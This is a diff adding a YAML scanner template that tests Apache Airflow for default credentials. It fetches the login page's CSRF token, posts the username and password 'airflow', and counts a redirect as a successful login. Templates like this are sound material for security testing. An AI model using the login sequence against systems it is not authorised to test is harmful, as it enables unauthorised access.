@@ -1,0 +1,48 @@
+id: apache-airflow-default-password
+info:
+  name: Apache Airflow Default Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Airflow is a platform created by the community to programmatically author, schedule, and monitor workflows. This template checks for default credentials in Apache Airflow that could allow attackers to log in and control the system.
+  tags: default-password
+  reference:
+    - http://airflow.incubator.apache.org/docs/apache-airflow/stable/start/docker.html
+http:
+  - raw:
+      - |
+        GET /login/ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "var csrfToken = '(.*?)';"
+    extractors:
+      - type: regex
+        name: csrfToken
+        part: body
+        regex:
+          - "var csrfToken = '(.*?)';"
+        group: 1
+        internal: true
+  - raw:
+      - |
+        POST /login/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_token={{csrfToken}}&username=airflow&password=airflow
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "You should be redirected automatically to target URL: <a href=\"/\""
